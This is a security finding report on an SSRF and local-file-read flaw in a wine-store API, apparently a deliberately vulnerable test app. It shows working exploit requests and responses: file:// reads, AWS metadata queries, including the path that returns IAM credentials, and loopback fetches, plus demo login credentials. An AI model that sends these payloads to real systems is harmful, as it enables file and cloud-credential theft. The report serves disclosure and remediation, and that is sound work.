# SSRF and Arbitrary Local File Read via POST /wines/import-url ("url" body parameter)

**ID:** vuln-0021
**Severity:** HIGH
**Found:** 2026-07-20 12:29:30 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /wines/import-url
**Method:** POST
**CWE:** CWE-918
**CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

## Description

The endpoint `POST /wines/import-url` on `api.taintedport.com` accepts a user-supplied URL in the JSON body and performs a server-side fetch of that URL, returning the raw response body inside the JSON reply as the `raw_content` field. The URL is not validated: no scheme allow-list, no host/IP allow-list, no redirect controls, and no output filtering. As a result, any authenticated user (including a self-registered non-admin account) can:

1. Read arbitrary local files readable by the API process by supplying `file://` URLs (Local File Inclusion via PHP's `file://` stream wrapper).
2. Reach the AWS EC2 Instance Metadata Service via `http://169.254.169.254/…` (Server-Side Request Forgery to the cloud-metadata surface, IMDSv1).
3. Reach loopback and internal RFC1918 hosts on the API server's network, exfiltrating full HTTP response bodies back to the attacker in the same request.

Only URL schemes not supported by PHP's default stream wrappers (`gopher://`, `dict://`, `ftp://`) fail; every other tested primitive succeeds. The Bearer-token requirement is not a mitigation because user registration is open with no email verification, so any anonymous internet attacker can obtain a valid JWT in one HTTP request.

## Attack Flow

```
SSRF + LFI via POST /wines/import-url
                       ─────────────────────────────────────

  ┌──────────────┐                                ┌────────────────────────────┐
  │              │  (1) POST /auth/register       │  api.taintedport.com       │
  │  Attacker    │─────────────────────────────▶  │  (PHP API)                 │
  │  (internet)  │  {email,password}              │                            │
  │              │ ◀───────────────────────────── │  201 + JWT (non-admin)     │
  └──────┬───────┘        JWT                     └──────────────┬─────────────┘
         │                                                       │
         │  (2) POST /wines/import-url                            │
         │      Authorization: Bearer <jwt>                       │
         │      {"url":"file:///etc/hostname"}                    │
         ├─────────────────────────────────────────────────────▶  │
         │                                            file://─────┤
         │                                              wrapper   │
         │                                                        ▼
         │                                              ┌────────────────────┐
         │                                              │ Local filesystem   │
         │                                              │   /etc/hostname    │
         │                                              │   /var/www/...     │
         │                                              │   .env / secrets   │
         │                                              └─────────┬──────────┘
         │  ◀───────────────────────────────────────────────────  │
         │     200 { raw_content: "4148066827d9\n" }              │
         │                                                        │
         │  (3) POST /wines/import-url                            │
         │      {"url":"http://169.254.169.254/latest/meta-data/"}│
         ├─────────────────────────────────────────────────────▶  │
         │                                             http://────┤
         │                                                        │
         │                             ┌──────────────────────────▼──────┐
         │                             │ AWS EC2 IMDSv1                  │
         │                             │ 169.254.169.254                 │
         │                             │  → ami-id, instance-id,         │
         │                             │    identity-credentials/,       │
         │                             │    iam/, network/, ...          │
         │                             └──────────────────────────┬──────┘
         │  ◀──────────────────────────────────────────────────── │
         │     200 { raw_content: "<full metadata listing>" }     │
         │                                                        │
         │  (4) {"url":"http://127.0.0.1/"}                       │
         ├─────────────────────────────────────────────────────▶  │
         │                                                        │
         │                                 ┌──────────────────────▼──────┐
         │                                 │ 127.0.0.1:80                │
         │                                 │ Internal Next.js frontend   │
         │                                 │ (RFC1918 hosts equally      │
         │                                 │  reachable and exfiltrated) │
         │                                 └──────────────────────┬──────┘
         │  ◀──────────────────────────────────────────────────── │
         │     200 { raw_content: "<!DOCTYPE html>...TaintedPort" }
         │                                                        │
         ▼                                                        ▼

  Root cause: attacker-controlled URL → broad server-side fetch → full body echoed back
  ───────────────────────────────────────────────────────────────────────────────────
     [X] no scheme allow-list  (file://, http:// to internal, all accepted)
     [X] no host/IP filter     (link-local + loopback + RFC1918 reachable)
     [X] no response redaction (raw_content returned verbatim)
     [X] IMDSv1 still enabled on the EC2 instance (no PUT-token requirement)

  Prerequisites for the attacker:
     - Reachability of api.taintedport.com (public)
     - Any account — obtainable via open /auth/register OR via public demo creds
       disclosed by /openapi.yaml (joe@example.com / password123)
```

## Impact

A single authenticated request lets an attacker:

- Read arbitrary local files readable by the API service user via `file://` URIs — this includes application source code, configuration files, `.env` files, private keys, session files, and any other secret material on the host filesystem. During validation `/etc/hostname` was retrieved as a benign proof; every file the PHP process can `open()` is equally reachable.
- Enumerate and query the AWS EC2 instance metadata service via IMDSv1. The full `/latest/meta-data/` listing was returned, including entries such as `identity-credentials/`, `iam/` scaffolding, `network/`, `placement/`, and the specific instance-id `i-001f7592c2feb4724`. If an IAM role is ever attached to this instance (or an equivalent SSRF exists on a sibling instance that has one), the same primitive yields temporary AWS credentials in a single request.
- Reach any host on the API server's local network — 127.0.0.1 and any RFC1918 destination — bypassing whatever perimeter firewalling protects those hosts from the internet. Since the fetched body is echoed into `raw_content`, responses from internal services are exfiltrated to the attacker as well. This turns unauthenticated internal admin pages, PHP-FPM status, orchestrator sidecars, in-cluster APIs, etc. into directly-readable resources.
- Perform internal port scanning by observing response bodies and error message differences.

Business impact: full confidentiality break of anything the API process can reach on the local filesystem or on the internal network, plus cloud-metadata reconnaissance that materially reduces the cost of any future privilege-escalation into the AWS tenancy. Because the JWT can be obtained by simply registering, the effective privileges required to reach this primitive from the open internet is negligible.

## Technical Analysis

The endpoint is a URL fetcher. When called with `{"url": "..."}` it:

1. Passes the string directly to a PHP HTTP client (behaviour matches `file_get_contents($url)` with PHP's default stream wrappers registered).
2. Attempts to `json_decode` the body. If it parses, the endpoint returns `{"success":true, "imported":{…}}`. If not, it returns `{"success":true, "message":"Content fetched but is not valid JSON wine data.", "raw_content":"<verbatim body>"}`.
3. There is **no** scheme validation: `file://` is honoured (PHP file wrapper), and `http://` is honoured regardless of destination IP.
4. There is **no** host/IP filtering: link-local (169.254.169.254), loopback (127.0.0.1), and RFC1918 addresses all resolve and are contacted.
5. There is **no** output filtering: the full fetched body is returned to the attacker verbatim, which converts what could have been a blind SSRF into a full-response exfiltration primitive.
6. Only schemes not supported by PHP's default stream wrappers (`gopher://`, `dict://`, `ftp://`) fail with `400 Failed to fetch content` — filtering is entirely delegated to what PHP's core wrappers do or do not support.

Authentication requirement: the endpoint enforces JWT auth (returns `401 {"success":false,"message":"Access denied. No token provided."}` without a Bearer token). However, `POST /auth/register` is open with no email verification, no CAPTCHA, and no admin approval — an anonymous internet caller obtains a valid JWT with a single request, so authentication is not a barrier in practice.

Root cause: attacker-controlled URL is passed to a broad HTTP/stream client with no scheme allow-list, no host allow-list, no response redaction, and no egress firewalling on the API host. Any of the four mitigations (allow-list host, allow-list scheme, redact response, deny egress to link-local/RFC1918) would materially reduce impact; all four are absent.

## Proof of Concept

Prerequisites: any valid JWT for the API. Obtainable by (a) `POST /auth/register` (open self-registration, HTTP 201 returns a JWT) or (b) `POST /auth/login` with the demo credentials publicly disclosed in `/openapi.yaml` (joe@example.com/password123, jane@example.com/password123).

Independent reproduction steps (all rules-of-engagement-safe):

1. Register a fresh non-admin account:
   `POST /auth/register` with `{"email":"validator27+ssrf@test.local","password":"Testing123!","name":"Val27"}` → HTTP 201 with a JWT and `user.is_admin: false`.

2. Local File Read via file:// wrapper:
   `POST /wines/import-url` with `Authorization: Bearer <jwt>` and body `{"url":"file:///etc/hostname"}` → HTTP 200 with `raw_content: "4148066827d9\n"`. Any file readable by the API process user is exposed by this primitive.

3. SSRF to AWS IMDSv1 — metadata listing:
   `POST /wines/import-url` with body `{"url":"http://169.254.169.254/latest/meta-data/"}` → HTTP 200 with `raw_content` containing the full IMDS top-level listing (ami-id, block-device-mapping/, identity-credentials/, instance-id, network/, placement/, public-keys/, security-groups, services/, etc.).

4. SSRF to AWS IMDSv1 — instance-id extraction:
   `POST /wines/import-url` with body `{"url":"http://169.254.169.254/latest/meta-data/instance-id"}` → HTTP 200 with `raw_content: "i-001f7592c2feb4724"`.

5. SSRF to loopback with body exfiltration:
   `POST /wines/import-url` with body `{"url":"http://127.0.0.1/"}` → HTTP 200 with `raw_content` containing the internal Next.js frontend HTML (`<!DOCTYPE html>…<title>TaintedPort - Portuguese Wine Store (Security Test App)</title>…`). Proves both internal-network reachability and response exfiltration.

Automated reproduction: `poc.py` runs all four probes end-to-end. Regression test: `verify.py` exits 0 while the endpoint remains vulnerable, exit 1 once mitigations land.

No sensitive files, no IAM credential endpoints, no SSH keys, no environment files, and no non-owned accounts were accessed during validation. Only benign proof targets were retrieved.

```
See poc.py — attached via poc_script_path.
```

## Evidence

### 1. Attacker self-registers a non-admin account (no email verification)

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"validator27+ssrf@test.local","password":"Testing123!","name":"Val27"}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....","user":{"id":504,"name":"Val27","email":"validator27+ssrf@test.local","is_admin":false}}
```

> Any anonymous internet user can obtain a valid JWT by self-registering. Combined with the SSRF/LFI below, the effective privileges-required is near zero.

### 2. LFI via file:// scheme - server reads /etc/hostname

**Request:**
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"url":"file:///etc/hostname"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Content fetched but is not valid JSON wine data.","raw_content":"4148066827d9\n","url":"file:\/\/\/etc\/hostname"}
```

> The endpoint accepted the file:// scheme and returned the file body verbatim in raw_content. Any file readable by the PHP-FPM/Apache user is exposed - application source, config, env files, secrets, session data.

### 3. SSRF to AWS EC2 IMDSv1 - metadata listing

**Request:**
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"raw_content":"ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhostname\nidentity-credentials/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/\nsystem","url":"http:\/\/169.254.169.254\/latest\/meta-data\/"}
```

> The metadata service replied with the standard IMDSv1 top-level listing. The presence of identity-credentials/ and profile entries shows the metadata endpoint is unrestricted; only the IAM role attachment state limits credential extraction.

### 4. SSRF to AWS EC2 IMDSv1 - instance-id exfiltrated

**Request:**
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/instance-id"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"raw_content":"i-001f7592c2feb4724","url":"http:\/\/169.254.169.254\/latest\/meta-data\/instance-id"}
```

> Cloud-tenancy-scoped identifier exfiltrated in a single request. Any other IMDS path (iam/security-credentials/*, user-data, hostname, etc.) is reachable with the same primitive.

### 5. SSRF to loopback - internal Next.js frontend on 127.0.0.1:80

**Request:**
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"url":"http://127.0.0.1/"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"raw_content":"<!DOCTYPE html><html lang=\"en\">...<title>TaintedPort - Portuguese Wine Store (Security Test App)</title>...","url":"http:\/\/127.0.0.1\/"}
```

> Full HTML body of the internal service is echoed to the attacker. This proves both loopback reachability AND response exfiltration, so internal admin panels / status pages / unauthenticated internal APIs are directly accessible and their contents leaked.

### 6. Auth check - unauthenticated request returns 401

**Request:**
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"url":"file:///etc/hostname"}
```

**Response:**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Access denied. No token provided."}
```

> Authentication is enforced, so PR=L. However, self-registration is open (step 1), making the practical exploitation barrier trivial.


## Remediation

1. Remove or hard-restrict the URL fetcher. If a URL-based wine import is required, constrain it to an allow-list of external hostnames known to publish legitimate wine data; reject every other host with HTTP 400.
2. Enforce a scheme allow-list of only `https://`. Explicitly reject `file://`, `http://` (internal only), `gopher://`, `dict://`, `ftp://`, `php://`, `data://`, `phar://`, `zip://`, `expect://`, and any custom PHP stream wrapper.
3. Resolve the target hostname before connecting and reject the request if the resolved address falls in any of: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10`, `169.254.0.0/16` (link-local — blocks AWS/GCP/Alibaba/Azure metadata), `0.0.0.0/8`, `::1/128`, `fe80::/10`, `fc00::/7`. Re-check the resolved address on every HTTP redirect, or disable redirects entirely. Guard against DNS rebinding by resolving once and connecting by IP literal, or by resolving twice and comparing.
4. Do not echo the raw fetched body back in the JSON envelope. Parse the response against the expected wine schema and return only whitelisted structured fields. This alone downgrades a full-response SSRF to a blind SSRF and eliminates the LFI read primitive.
5. Migrate the EC2 instance to IMDSv2 with `HttpTokens=required` and `HttpPutResponseHopLimit=1`. This blocks server-side attackers that cannot send `PUT` requests to the metadata service.
6. Add a Content-Length ceiling and a fetch timeout on the outbound request to prevent DoS via slowloris or gigantic responses.
7. Add an egress firewall on the API host that denies outbound traffic to `169.254.169.254` and to loopback/RFC1918 destinations for the PHP process user.
8. Close open user registration OR ensure user registration cannot bypass a rate-limit and email-verification step — while not the root cause, open self-registration reduces the effective PR of this and similar authenticated primitives to near zero.
9. Rotate any secrets that were reachable through the file:// primitive or IMDS calls during the exposure window (database credentials, JWT signing key, API keys, TLS keys).

## Conditions for Severity Increase

Severity would rise to Critical (CVSS 9.x) under any of the following external conditions, none of which requires a code change to the vulnerable endpoint:

1. IAM role attached to the API instance. IMDSv1 is confirmed reachable and the `identity-credentials/` and `iam/` paths are present in the listing. If any IAM role is attached (now or later), a single request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns temporary AWS credentials directly to the attacker. That escalates Integrity and Availability to H (attacker can write to and destroy AWS resources reachable by the role) and changes the finding into a full cloud-account compromise.

2. Migration/rehost of this API onto a sibling instance that already has a role. Same effect as (1). The vulnerability is a property of the code, not the tenancy.

3. High-value secrets present on the local filesystem readable by the PHP process (JWT signing key, shared database credentials, `.env` with third-party API keys, SSH private keys). Because the LFI primitive is unrestricted within the PHP process's file permissions, discovery of any single high-value secret path immediately extends impact beyond the API boundary and typically enables authentication bypass or lateral movement.

4. Unauthenticated internal admin panels or state-changing services on 127.0.0.1 / RFC1918. Loopback reachability + response exfiltration is already confirmed. If any such service exists (PHP-FPM status, Redis, Elasticsearch, internal Next.js admin routes, orchestrator sidecars), it becomes directly abusable through this SSRF, which would push Integrity to H.

5. Removal of the authentication check on `/wines/import-url` (e.g. accidental route middleware regression) would reduce PR to N and make the finding directly reachable by any anonymous internet caller — but note that open self-registration already makes practical PR effectively zero.
